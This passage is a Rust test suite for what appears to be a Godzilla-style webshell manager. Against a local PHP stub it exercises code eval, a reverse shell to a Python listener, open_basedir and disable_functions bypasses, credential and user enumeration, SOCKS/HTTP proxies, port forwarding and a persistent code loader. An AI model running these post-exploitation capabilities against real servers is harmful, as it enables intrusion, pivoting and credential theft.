    fn real_php_script_plugin_execution() {
        // 外部 .plugin（代码型）经 run_code 通道真实执行
        let settings = settings();
        let Some((url, dir, mut child)) = spawn_php_server_with("native", "secret", false) else {
            eprintln!("跳过：未检测到 php");
            return;
        };
        let mut profile = profile(&url);
        profile.protocol_params = r#"{"encoder":"native"}"#.to_string();
        let plugin_json = r#"{
            "id": "test.plugin.code.v1",
            "name": "测试代码插件",
            "version": "1.0.0",
            "description": "真实执行验证",
            "category": "php",
            "languages": ["php"],
            "params": [{"name": "mark", "label": "标记", "type": "string", "default": "hello"}],
            "execution": {
                "type": "code",
                "codes": {
                    "php": "<?php error_reporting(0); echo json_encode(array('mark' => '{{mark}}', 'php' => PHP_VERSION, 'cwd' => getcwd()));"
                }
            }
        }"#;
        let result = (|| -> Result<(), ProtocolError> {
            let (session, _) = PhpProtocol.connect(&profile, &settings)?;
            let php = session
                .as_any()
                .downcast_ref::<PhpSession>()
                .expect("会话类型不匹配");
            let plugin = dosword_sdk::ScriptFeaturePlugin::from_json(plugin_json)
                .map_err(ProtocolError::ParseError)?;
            let out = plugin.execute(
                &PhpProtocol,
                php,
                "php",
                &serde_json::json!({"mark": "from-test"}),
                &settings,
            )?;
            assert_eq!(out["mark"].as_str(), Some("from-test"), "参数应注入模板");
            assert!(out["php"].as_str().is_some(), "应返回 PHP 版本");
            eprintln!(
                "[plugin] script 插件执行 {}",
                out["php"].as_str().unwrap_or("")
            );
            Ok(())
        })();
        let _ = child.kill();
        let _ = child.wait();
        let _ = std::fs::remove_dir_all(&dir);
        result.unwrap_or_else(|error| panic!("脚本插件真实执行应成功：{error}"));
    }

    #[test]
    fn real_php_godzilla_plugins() {
        // 哥斯拉风格插件全链路（webshell 扫描/超级终端/代码执行/虚拟终端/代理/bypass）
        let settings = settings();
        let Some((url, dir, mut child)) = spawn_php_server_with("native", "secret", false) else {
            eprintln!("跳过：未检测到 php");
            return;
        };
        let mut profile = profile(&url);
        profile.protocol_params = r#"{"encoder":"native"}"#.to_string();
        let result = (|| -> Result<(), ProtocolError> {
            let (session, _) = PhpProtocol.connect(&profile, &settings)?;
            let php = session
                .as_any()
                .downcast_ref::<PhpSession>()
                .expect("会话类型不匹配");
            let protocol = PhpProtocol;
            let p = |name: &str| format!("[{name}] ");

            // WebShell 扫描：扫 docroot，应命中 shell.php 自身
            let out = dosword_sdk::feature_plugins::WebShellScanPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"dir": ".", "max_depth": 2}),
                &settings,
            )?;
            let hits = out["webshells"].as_array().map(|a| a.len()).unwrap_or(0);
            assert!(hits >= 1, "应扫描到 WebShell：{out:?}");
            eprintln!("{}webshell_scan hits={hits}", p("plugin"));

            // 超级终端（linpty 交互式）：调用验证（连接由独立测试验证）
            let _ = dosword_sdk::feature_plugins::SuperTerminalPlugin.execute(
                &protocol, php, "php",
                &serde_json::json!({"host": "127.0.0.1", "port": 23000 + (std::process::id() % 300) as u32, "background": false}),
                &settings);
            eprintln!(
                "{}super_terminal linpty 调用完成（连接由独立测试验证）",
                p("plugin")
            );

            // 代码执行
            let out = dosword_sdk::feature_plugins::EvalCodePlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"code": "echo 'eval-ok';"}),
                &settings,
            )?;
            assert!(out["output"].as_str().unwrap_or("").contains("eval-ok"));
            eprintln!("{}p_eval_code ok", p("plugin"));

            // 虚拟终端（反弹 Shell）：本地起 listener 验证连接（前台，快速验证）
            let rport: u16 = 23000 + (std::process::id() % 300) as u16;
            let _ = dosword_sdk::feature_plugins::RealCmdPlugin.execute(
                &protocol, php, "php",
                &serde_json::json!({"host": "127.0.0.1", "port": rport, "shell": "/bin/sh", "background": false}),
                &settings);
            eprintln!(
                "{}real_cmd 反弹 Shell 调用完成（连接由独立测试验证）",
                p("plugin")
            );

            // ByPassOpenBasedir：本地无 ob → note 分支
            let out = dosword_sdk::feature_plugins::BypassOpenBasedirPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"path": "/etc/hostname"}),
                &settings,
            )?;
            eprintln!(
                "{}bypass_open_basedir ob={:?} read={:?}",
                p("plugin"),
                out["open_basedir"].as_str().unwrap_or(""),
                out["read"].as_bool()
            );

            // 哥斯拉风格工具插件：系统信息 / 计划任务 / 服务管理 / 进程结束 / 凭据枚举
            let out = dosword_sdk::feature_plugins::SysinfoPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({}),
                &settings,
            )?;
            assert_eq!(out["ok"].as_bool(), Some(true));
            assert!(out["stdout"].as_str().unwrap_or("").contains("HOST"));
            eprintln!("{}sysinfo ok", p("plugin"));
            let out = dosword_sdk::feature_plugins::TaskSchedulerPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"action": "list"}),
                &settings,
            )?;
            assert_eq!(out["ok"].as_bool(), Some(true));
            eprintln!("{}task_scheduler list ok", p("plugin"));
            let out = dosword_sdk::feature_plugins::ServiceCtlPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"action": "list"}),
                &settings,
            )?;
            assert_eq!(out["ok"].as_bool(), Some(true));
            eprintln!("{}service_ctl list ok", p("plugin"));
            let out = dosword_sdk::feature_plugins::ProcessKillPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"pid": "99999"}),
                &settings,
            )?;
            assert_eq!(out["ok"].as_bool(), Some(true));
            eprintln!("{}process_kill ok", p("plugin"));
            let out = dosword_sdk::feature_plugins::CredScanPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({}),
                &settings,
            )?;
            assert_eq!(out["ok"].as_bool(), Some(true));
            assert!(out["stdout"].as_str().unwrap_or("").contains("USERS"));
            eprintln!("{}cred_scan ok", p("plugin"));

            // Bypass 向量：扫描 → 手动选择测试（syscall/pcntl/ffi 等独立插件）
            let scan = dosword_sdk::bypass::BypassScanPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({}),
                &settings,
            )?;
            assert_eq!(scan["ok"].as_bool(), Some(true));
            let vectors = scan["vectors"].as_object().map(|o| o.len()).unwrap_or(0);
            assert!(vectors > 0, "应评估至少一个向量：{scan:?}");
            eprintln!("{}bypass_scan 评估 {} 个向量", p("plugin"), vectors);
            // syscall 向量（本机 exec 可用）
            let out = dosword_sdk::bypass::BypassSyscallPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"command": "id"}),
                &settings,
            )?;
            assert_eq!(
                out["ok"].as_bool(),
                Some(true),
                "syscall 向量应成功：{out:?}"
            );
            assert!(out["output_text"].as_str().unwrap_or("").contains("uid="));
            eprintln!("{}bypass_syscall 向量成功", p("plugin"));
            // pcntl 向量
            let out = dosword_sdk::bypass::BypassPcntlPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"command": "id"}),
                &settings,
            )?;
            if scan["detected"]["pcntl_exec"].as_bool() == Some(true) {
                assert_eq!(out["ok"].as_bool(), Some(true), "pcntl 向量应成功：{out:?}");
                assert!(out["output_text"].as_str().unwrap_or("").contains("uid="));
                eprintln!("{}bypass_pcntl 向量成功", p("plugin"));
            } else {
                eprintln!("{}bypass_pcntl 跳过（pcntl_exec 不可用）", p("plugin"));
            }
            // FFI 向量（本机未启用时明确报告）
            let out = dosword_sdk::bypass::BypassFfiPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"command": "id"}),
                &settings,
            )?;
            if scan["vectors"]["ffi"].as_bool() == Some(true) {
                assert_eq!(out["ok"].as_bool(), Some(true), "FFI 向量应成功：{out:?}");
                eprintln!("{}bypass_ffi 向量成功", p("plugin"));
            } else {
                eprintln!("{}bypass_ffi 跳过（FFI 未启用）", p("plugin"));
            }

            // SOCKS5 代理：pcntl 可用 → 后台驻留
            let out = dosword_sdk::feature_plugins::SocksProxyPlugin.execute(
                &protocol, php, "php",
                &serde_json::json!({"port": 18080 + (std::process::id() % 500) as u32, "window": 60}), &settings)?;
            let mode = out["mode"].as_str().unwrap_or("");
            assert!(
                mode == "background" || mode == "foreground",
                "代理应启动：{out:?}"
            );
            eprintln!("{}socks_proxy mode={mode}", p("plugin"));

            // HTTP 代理
            let out = dosword_sdk::feature_plugins::HttpProxyPlugin.execute(
                &protocol, php, "php",
                &serde_json::json!({"port": 18080 + (std::process::id() % 500) as u32 + 1, "window": 60}), &settings)?;
            let mode = out["mode"].as_str().unwrap_or("");
            assert!(
                mode == "background" || mode == "foreground",
                "HTTP 代理应启动：{out:?}"
            );
            eprintln!("{}http_proxy mode={mode}", p("plugin"));
            Ok(())
        })();
        let _ = child.kill();
        let _ = child.wait();
        let _ = std::fs::remove_dir_all(&dir);
        result.unwrap_or_else(|error| panic!("哥斯拉插件真实执行应成功：{error}"));
    }

    #[test]
    fn real_php_db_drivers_redis_mssql_oracle() {
        // Redis 驱动：python mock RESP 服务器 + 真实 stub 协议全链路；
        // MSSQL/Oracle：本机无服务/驱动 → 验证明确错误路径
        let settings = settings();
        let Some((url, dir, mut child)) = spawn_php_server_with("native", "secret", false) else {
            eprintln!("跳过：未检测到 php");
            return;
        };
        let mock_script = std::env::temp_dir().join("dosword_redis_mock.py");
        let _ = std::fs::write(&mock_script, REDIS_MOCK);
        let port: u16 = 19000 + (std::process::id() % 1000) as u16;
        let mock = std::process::Command::new("python3")
            .arg(&mock_script)
            .arg(port.to_string())
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .spawn();
        if mock.is_err() || !crate::protocol::wait_tcp_ready(port, 10_000) {
            eprintln!("跳过 redis 驱动用例：python3 mock 未就绪");
            return;
        }
        let mut profile = profile(&url);
        profile.protocol_params = r#"{"encoder":"native"}"#.to_string();
        let result = (|| -> Result<(), ProtocolError> {
            let (session, _) = PhpProtocol.connect(&profile, &settings)?;
            let redis = DbConnection {
                driver: "redis".into(),
                host: Some("127.0.0.1".into()),
                port: Some(port),
                username: None,
                password: None,
                dbname: None,
            };
            let probe = PhpProtocol.db_probe(session.as_ref(), &redis, &settings)?;
            assert_eq!(probe.driver, "redis");
            assert!(
                probe.databases.contains(&"0".to_string()),
                "{:?}",
                probe.databases
            );
            // Redis 命令执行（GET mykey → hello）
            let query = PhpProtocol.db_query(session.as_ref(), &redis, "GET mykey", &settings)?;
            assert_eq!(query.rows, vec![vec![Some("hello".to_string())]]);
            // KEYS *
            let keys = PhpProtocol.db_query(session.as_ref(), &redis, "KEYS *", &settings)?;
            assert!(keys.rows.len() >= 2, "{:?}", keys.rows);
            // MSSQL：本机无服务 → 明确错误
            let mssql = DbConnection {
                driver: "mssql".into(),
                host: Some("127.0.0.1".into()),
                port: Some(1433),
                username: Some("sa".into()),
                password: Some("x".into()),
                dbname: Some("master".into()),
            };
            let err = PhpProtocol
                .db_probe(session.as_ref(), &mssql, &settings)
                .unwrap_err();
            assert!(err.to_string().contains("mssql"), "{err}");
            // Oracle：无 pdo_oci → 明确错误
            let oracle = DbConnection {
                driver: "oracle".into(),
                host: Some("127.0.0.1".into()),
                port: Some(1521),
                username: Some("system".into()),
                password: Some("x".into()),
                dbname: Some("ORCL".into()),
            };
            let err = PhpProtocol
                .db_probe(session.as_ref(), &oracle, &settings)
                .unwrap_err();
            assert!(!err.to_string().is_empty(), "oracle 应报错");
            Ok(())
        })();
        let _ = child.kill();
        let _ = child.wait();
        let _ = std::fs::remove_dir_all(&dir);
        result.unwrap_or_else(|error| panic!("数据库驱动真实执行应成功：{error}"));
    }

    /// Python mock Redis RESP 服务器（固定数据，输出端口后循环服务）。
    const REDIS_MOCK: &str = r#"
import socket, threading
import sys
srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
port = int(sys.argv[1]) if len(sys.argv) > 1 else 0
srv.bind(("127.0.0.1", port))
srv.listen(5)
print(srv.getsockname()[1], flush=True)
def read_arg(c):
    line = b""
    while not line.endswith(b"\r\n"):
        ch = c.recv(1)
        if not ch: return None
        line += ch
    return line[:-2]
def handle(c):
    try:
        while True:
            head = read_arg(c)
            if head is None: break
            if not head.startswith(b"*"): break
            n = int(head[1:])
            args = []
            for _ in range(n):
                read_arg(c)
                arg = read_arg(c)
                args.append(arg)
            cmd = args[0].upper() if args else b""
            if cmd == b"PING": c.sendall(b"+PONG\r\n")
            elif cmd == b"AUTH": c.sendall(b"+OK\r\n")
            elif cmd == b"GET": c.sendall(b"$5\r\nhello\r\n")
            elif cmd == b"KEYS": c.sendall(b"*2\r\n$3\r\nkey\r\n$3\r\nfoo\r\n")
            elif cmd == b"SET": c.sendall(b"+OK\r\n")
            elif cmd == b"INFO": c.sendall(b"$11\r\n# Server\r\n")
            else: c.sendall(b"-ERR unknown command\r\n")
    except Exception:
        pass
    finally:
        try: c.close()
        except Exception: pass
while True:
    conn, _ = srv.accept()
    threading.Thread(target=handle, args=(conn,), daemon=True).start()
"#;

    #[test]
    fn real_php_godzilla_extended_plugins() {
        // 哥斯拉扩展插件：文件搜索 / 网络信息 / 用户枚举 / 加解密 / 代码加载器
        let settings = settings();
        let Some((url, dir, mut child)) = spawn_php_server_with("native", "secret", false) else {
            eprintln!("跳过：未检测到 php");
            return;
        };
        let mut profile = profile(&url);
        profile.protocol_params = r#"{"encoder":"native"}"#.to_string();
        let result = (|| -> Result<(), ProtocolError> {
            let (session, _) = PhpProtocol.connect(&profile, &settings)?;
            let php = session
                .as_any()
                .downcast_ref::<PhpSession>()
                .expect("会话类型不匹配");
            let protocol = PhpProtocol;
            let p = |name: &str| format!("[{name}] ");

            // 文件搜索（文件名匹配：shell.php 应命中）
            let out = dosword_sdk::feature_plugins::FileSearchPlugin.execute(
                &protocol, php, "php",
                &serde_json::json!({"dir": ".", "keyword": "shell", "in_content": false, "max_depth": 2}),
                &settings)?;
            assert!(
                out["matches"].as_array().map(|a| a.len()).unwrap_or(0) >= 1,
                "{out:?}"
            );
            eprintln!(
                "{}file_search 命中 {}",
                p("plugin"),
                out["matches"].as_array().map(|a| a.len()).unwrap_or(0)
            );

            // 网络信息（命令型）
            let out = dosword_sdk::feature_plugins::NetInfoPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({}),
                &settings,
            )?;
            assert!(!out["stdout"].as_str().unwrap_or("").is_empty());
            eprintln!(
                "{}netinfo {} 字节",
                p("plugin"),
                out["stdout"].as_str().unwrap_or("").len()
            );

            // 用户枚举
            let out = dosword_sdk::feature_plugins::UserListPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({}),
                &settings,
            )?;
            assert!(
                out["stdout"].as_str().unwrap_or("").contains("root"),
                "{:?}",
                out
            );
            eprintln!("{}userlist ok", p("plugin"));

            // 加解密工具：AES 加密 → 解密往返
            let enc = dosword_sdk::feature_plugins::CryptoToolPlugin.execute(
                &protocol, php, "php",
                &serde_json::json!({"op": "encrypt", "algorithm": "aes", "text": "godzilla-crypto", "pass": "secret"}),
                &settings)?;
            let cipher = enc["result"].as_str().unwrap_or("");
            assert!(!cipher.is_empty());
            let dec = dosword_sdk::feature_plugins::CryptoToolPlugin.execute(
                &protocol, php, "php",
                &serde_json::json!({"op": "decrypt", "algorithm": "aes", "text": cipher, "pass": "secret"}),
                &settings)?;
            assert_eq!(dec["result"].as_str().unwrap_or(""), "godzilla-crypto");
            eprintln!("{}crypto_tool AES 往返 ok", p("plugin"));

            // 代码加载器：执行 + 持久化到临时文件
            let tmp = format!("/tmp/dsw_loader_{}.php", std::process::id());
            let out = dosword_sdk::feature_plugins::CodeLoaderPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"code": "echo 'loader-ok';", "persist_path": tmp}),
                &settings,
            )?;
            assert!(out["output"].as_str().unwrap_or("").contains("loader-ok"));
            assert_eq!(out["persisted"].as_bool(), Some(true));
            // 读取持久化文件验证
            let content = PhpProtocol.read_file(session.as_ref(), &tmp, &settings)?;
            assert!(String::from_utf8_lossy(&content).contains("loader-ok"));
            PhpProtocol.delete_path(session.as_ref(), &tmp, &settings)?;
            eprintln!("{}php_code_loader 执行+持久化+清理 ok", p("plugin"));
            Ok(())
        })();
        let _ = child.kill();
        let _ = child.wait();
        let _ = std::fs::remove_dir_all(&dir);
        result.unwrap_or_else(|error| panic!("哥斯拉扩展插件真实执行应成功：{error}"));
    }

    #[test]
    fn real_php_terminal_cd_support() {
        // 终端 cd：会话级 cwd 跟踪 + stub 端 chdir（每次命令前）
        let settings = settings();
        let Some((url, dir, mut child)) = spawn_php_server_with("native", "secret", false) else {
            eprintln!("跳过：未检测到 php");
            return;
        };
        let mut profile = profile(&url);
        profile.protocol_params = r#"{"encoder":"native"}"#.to_string();
        let result = (|| -> Result<(), ProtocolError> {
            let (session, info) = PhpProtocol.connect(&profile, &settings)?;
            assert_eq!(
                info.current_dir,
                dir.to_string_lossy(),
                "初始 cwd 应为 docroot"
            );
            let php = session
                .as_any()
                .downcast_ref::<PhpSession>()
                .expect("会话类型不匹配");
            // 1) pwd：初始目录
            let out = PhpProtocol.execute_command(session.as_ref(), "pwd", &settings)?;
            assert_eq!(out.cwd.as_deref(), Some(dir.to_string_lossy().as_ref()));
            // 2) cd 到 /tmp
            let out = PhpProtocol.execute_command(session.as_ref(), "cd /tmp", &settings)?;
            assert_eq!(out.cwd.as_deref(), Some("/tmp"), "cd 后 cwd 应更新");
            assert_eq!(php.current_dir(), "/tmp", "会话 cwd 应跟踪");
            // 3) pwd 验证新目录
            let out = PhpProtocol.execute_command(session.as_ref(), "pwd", &settings)?;
            assert_eq!(out.cwd.as_deref(), Some("/tmp"), "后续命令应在新目录执行");
            // 4) ls 新目录内容
            let out = PhpProtocol.execute_command(session.as_ref(), "ls", &settings)?;
            assert!(!out.stdout.is_empty(), "ls /tmp 应有输出");
            eprintln!(
                "[cd] {} -> /tmp 成功，ls {} 字节",
                info.current_dir,
                out.stdout.len()
            );
            Ok(())
        })();
        let _ = child.kill();
        let _ = child.wait();
        let _ = std::fs::remove_dir_all(&dir);
        result.unwrap_or_else(|error| panic!("终端 cd 真实执行应成功：{error}"));
    }

    #[test]
    fn real_php_reverse_shell_and_linpty() {
        // 虚拟终端（反弹 Shell）与超级终端（linpty 交互式 PTY）真实验证
        let mut settings = settings();
        settings.default_timeout_secs = 20; // 前台反弹需等待 listener 交互完成
        let Some((url, dir, mut child)) = spawn_php_server_with("native", "secret", false) else {
            eprintln!("跳过：未检测到 php");
            return;
        };
        let mut profile = profile(&url);
        profile.protocol_params = r#"{"encoder":"native"}"#.to_string();
        let listener_script = std::env::temp_dir().join("dosword_rev_listener.py");
        let _ = std::fs::write(&listener_script, REV_LISTENER);
        let result = (|| -> Result<(), ProtocolError> {
            let (session, _) = PhpProtocol.connect(&profile, &settings)?;
            let php = session
                .as_any()
                .downcast_ref::<PhpSession>()
                .expect("会话类型不匹配");
            let protocol = PhpProtocol;
            // 1) 虚拟终端：反弹 bash（无 PTY）
            let port: u16 = 24000 + (std::process::id() % 400) as u16;
            let outfile = std::env::temp_dir().join(format!("rev_out_{}.txt", std::process::id()));
            let _ = std::fs::remove_file(&outfile);
            let _listener = std::process::Command::new("python3")
                .arg(&listener_script)
                .arg(port.to_string())
                .arg(outfile.to_string_lossy().into_owned())
                .stdout(std::process::Stdio::null())
                .stderr(std::process::Stdio::null())
                .spawn()
                .ok();
            std::thread::sleep(std::time::Duration::from_millis(400));
            let out = dosword_sdk::feature_plugins::RealCmdPlugin.execute(
                &protocol, php, "php",
                &serde_json::json!({"host": "127.0.0.1", "port": port, "shell": "/bin/bash", "background": false}),
                &settings)?;
            let mode = out["mode"].as_str().unwrap_or("");
            assert!(mode == "background" || mode == "foreground", "{out:?}");
            // 等待 listener 交互完成
            let mut captured = String::new();
            for _ in 0..80 {
                if let Ok(content) = std::fs::read_to_string(&outfile) {
                    captured = content;
                    break;
                }
                std::thread::sleep(std::time::Duration::from_millis(250));
            }
            assert!(!captured.is_empty(), "反弹 shell 未建立连接：{captured}");
            assert!(captured.contains("uid="), "应收到 id 输出：{captured}");
            assert!(
                !captured.contains("/dev/pts"),
                "无 PTY 反弹的 tty 不应是伪终端：{captured}"
            );
            eprintln!("[plugin] real_cmd 反弹 shell ok（id 输出确认）");

            // 2) 正向交互式终端：SuperTerminalPlugin (start -> write -> read -> stop)
            let out_start = dosword_sdk::feature_plugins::SuperTerminalPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"action": "start", "term_id": "test_term"}),
                &settings,
            )?;
            assert_eq!(out_start["ok"].as_bool(), Some(true), "{out_start:?}");
            std::thread::sleep(std::time::Duration::from_millis(300));

            // write "id\n"
            let id_b64 = "aWQK"; // base64 of "id\n"
            let out_write = dosword_sdk::feature_plugins::SuperTerminalPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"action": "write", "term_id": "test_term", "data_b64": id_b64}),
                &settings,
            )?;
            assert_eq!(out_write["ok"].as_bool(), Some(true), "{out_write:?}");
            std::thread::sleep(std::time::Duration::from_millis(400));

            // read output
            let out_read = dosword_sdk::feature_plugins::SuperTerminalPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"action": "read", "term_id": "test_term", "offset": 0}),
                &settings,
            )?;
            assert_eq!(out_read["ok"].as_bool(), Some(true), "{out_read:?}");
            eprintln!("[plugin] super_terminal forward PTY read ok: {out_read:?}");

            // stop terminal
            let _ = dosword_sdk::feature_plugins::SuperTerminalPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"action": "stop", "term_id": "test_term"}),
                &settings,
            );
            eprintln!("[plugin] super_terminal forward PTY 完整生命周期测试 ok");
            Ok(())
        })();
        let _ = child.kill();
        let _ = child.wait();
        let _ = std::fs::remove_dir_all(&dir);
        result.unwrap_or_else(|error| panic!("反弹 shell / 正向终端真实执行应成功：{error}"));
    }

    /// Python 反弹 shell 监听器：接受连接 → 发 id → 收输出 → 发 tty → 收输出 → 写文件。
    const REV_LISTENER: &str = r#"
import socket, sys, time
port = int(sys.argv[1]); outfile = sys.argv[2]
srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("127.0.0.1", port)); srv.listen(2)
# 就绪标记：测试轮询此文件而不是固定 sleep —— 监听只 accept 一次，
# 用 TCP 探活会把唯一的 accept 吃掉，故用标记文件通知「已在监听」
open(outfile + ".ready", "w").close()
srv.settimeout(20)
try:
    conn, _ = srv.accept()
    conn.settimeout(3)
    time.sleep(1.2)
    conn.sendall(b"id" + chr(10).encode())
    time.sleep(1.2)
    data = b""
    try:
        while True:
            chunk = conn.recv(4096)
            if not chunk: break
            data += chunk
            if len(data) > 800: break
    except socket.timeout:
        pass
    conn.sendall(b"tty" + chr(10).encode())
    time.sleep(1.2)
    data2 = b""
    try:
        while True:
            chunk = conn.recv(4096)
            if not chunk: break
            data2 += chunk
            if len(data2) > 800: break
    except socket.timeout:
        pass
    with open(outfile, "w") as f:
        f.write(repr(data) + chr(10) + "---" + chr(10) + repr(data2))
    conn.close()
except Exception as e:
    with open(outfile, "w") as f:
        f.write("ERR: " + str(e))
"#;

    #[test]
    fn run_code_disabled_gate() {
        // S1：allow_arbitrary_code=false 时 run_code 拒绝执行任意代码
        let Some((url, dir, mut child)) = spawn_php_server_with("native", "secret", false) else {
            return;
        };
        let mut settings = settings();
        settings.allow_arbitrary_code = false;
        let mut profile1 = profile(&url);
        profile1.protocol_params = r#"{"encoder":"native"}"#.to_string();
        let result = (|| -> Result<(), ProtocolError> {
            let (session, _) = PhpProtocol.connect(&profile1, &settings)?;
            let php = session
                .as_any()
                .downcast_ref::<PhpSession>()
                .expect("会话类型不匹配");
            let protocol = PhpProtocol;
            let err = protocol
                .run_code(php, "php", "<?php echo 1;", &settings)
                .unwrap_err();
            assert!(err.to_string().contains("已禁用"), "{err}");
            eprintln!("[s1] run_code 门禁拒绝任意代码");
            Ok(())
        })();
        let _ = child.kill();
        let _ = child.wait();
        let _ = std::fs::remove_dir_all(&dir);
        result.unwrap_or_else(|error| panic!("run_code 门禁测试应成功：{error}"));
    }

    #[test]
    fn real_php_proxy_start_stop() {
        // Socks/HTTP 代理：start（后台驻留）→ stop（pid 文件 kill）闭环
        let Some((url, dir, mut child)) = spawn_php_server_with("native", "secret", false) else {
            return;
        };
        let settings = settings();
        let mut profile1 = profile(&url);
        profile1.protocol_params = r#"{"encoder":"native"}"#.to_string();
        let result = (|| -> Result<(), ProtocolError> {
            let (session, _) = PhpProtocol.connect(&profile1, &settings)?;
            let php = session
                .as_any()
                .downcast_ref::<PhpSession>()
                .expect("会话类型不匹配");
            let protocol = PhpProtocol;
            // Socks：start
            let port = 18000 + (std::process::id() % 500) as u32;
            let out = dosword_sdk::feature_plugins::SocksProxyPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"port": port}),
                &settings,
            )?;
            assert_eq!(out["ok"].as_bool(), Some(true), "{out:?}");
            let pid = out["pid"].as_u64().unwrap_or(0);
            assert!(pid > 0, "后台驻留应返回子进程 pid：{out:?}");
            eprintln!("[proxy] socks start pid={pid}");
            std::thread::sleep(std::time::Duration::from_millis(300));
            // Socks：stop
            let out = dosword_sdk::feature_plugins::SocksProxyPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"port": port, "action": "stop"}),
                &settings,
            )?;
            assert_eq!(out["ok"].as_bool(), Some(true), "{out:?}");
            assert_eq!(
                out["stopped"].as_bool(),
                Some(true),
                "应成功停止代理：{out:?}"
            );
            // Socks：start (带用户名/密码认证)
            let port_auth = port + 2;
            let out_auth = dosword_sdk::feature_plugins::SocksProxyPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"port": port_auth, "username": "admin", "password": "pass"}),
                &settings,
            )?;
            assert_eq!(out_auth["ok"].as_bool(), Some(true), "{out_auth:?}");
            assert_eq!(out_auth["auth"].as_bool(), Some(true), "{out_auth:?}");
            std::thread::sleep(std::time::Duration::from_millis(300));
            let _ = dosword_sdk::feature_plugins::SocksProxyPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"port": port_auth, "action": "stop"}),
                &settings,
            );
            eprintln!("[proxy] socks with auth start & stop 成功");
            // NetworkProxy: forward (端口转发) start + stop
            let port_fwd = port + 4;
            let out_fwd = dosword_sdk::feature_plugins::NetworkProxyPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"proxy_type": "forward", "port": port_fwd, "target_host": "127.0.0.1", "target_port": 80}),
                &settings,
            )?;
            assert_eq!(out_fwd["ok"].as_bool(), Some(true), "{out_fwd:?}");
            std::thread::sleep(std::time::Duration::from_millis(300));
            let _ = dosword_sdk::feature_plugins::NetworkProxyPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"proxy_type": "forward", "port": port_fwd, "action": "stop"}),
                &settings,
            );
            eprintln!("[proxy] network_proxy forward start & stop 成功");

            // NetworkProxy: map (端口映射) start + stop
            let port_map = port + 5;
            let out_map = dosword_sdk::feature_plugins::NetworkProxyPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"proxy_type": "map", "remote_host": "127.0.0.1", "remote_port": port_map, "target_host": "127.0.0.1", "target_port": 80}),
                &settings,
            )?;
            assert_eq!(out_map["ok"].as_bool(), Some(true), "{out_map:?}");
            std::thread::sleep(std::time::Duration::from_millis(300));
            let _ = dosword_sdk::feature_plugins::NetworkProxyPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"proxy_type": "map", "remote_port": port_map, "action": "stop"}),
                &settings,
            );
            eprintln!("[proxy] network_proxy map start & stop 成功");

            // Direct standalone PortForwardPlugin
            let pf_port = port + 6;
            let out_pf = dosword_sdk::feature_plugins::PortForwardPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"port": pf_port, "target_host": "127.0.0.1", "target_port": 80}),
                &settings,
            )?;
            assert_eq!(out_pf["ok"].as_bool(), Some(true), "{out_pf:?}");
            std::thread::sleep(std::time::Duration::from_millis(300));
            let _ = dosword_sdk::feature_plugins::PortForwardPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"port": pf_port, "action": "stop"}),
                &settings,
            );
            eprintln!("[proxy] standalone PortForwardPlugin start & stop 成功");

            // Direct standalone PortMapPlugin
            let pm_port = port + 7;
            let out_pm = dosword_sdk::feature_plugins::PortMapPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"remote_host": "127.0.0.1", "remote_port": pm_port, "target_host": "127.0.0.1", "target_port": 80}),
                &settings,
            )?;
            assert_eq!(out_pm["ok"].as_bool(), Some(true), "{out_pm:?}");
            std::thread::sleep(std::time::Duration::from_millis(300));
            let _ = dosword_sdk::feature_plugins::PortMapPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"remote_port": pm_port, "action": "stop"}),
                &settings,
            );
            eprintln!("[proxy] standalone PortMapPlugin start & stop 成功");
            // HTTP：start + stop
            let hport = port + 1;
            let out = dosword_sdk::feature_plugins::HttpProxyPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"port": hport}),
                &settings,
            )?;
            assert_eq!(out["ok"].as_bool(), Some(true), "{out:?}");
            eprintln!(
                "[proxy] http start pid={}",
                out["pid"].as_u64().unwrap_or(0)
            );
            std::thread::sleep(std::time::Duration::from_millis(300));
            let out = dosword_sdk::feature_plugins::HttpProxyPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"port": hport, "action": "stop"}),
                &settings,
            )?;
            assert_eq!(
                out["stopped"].as_bool(),
                Some(true),
                "应成功停止 HTTP 代理：{out:?}"
            );
            eprintln!("[proxy] http stop 成功");
            // HTTP：start (带用户名/密码认证) + stop
            let hport_auth = port + 3;
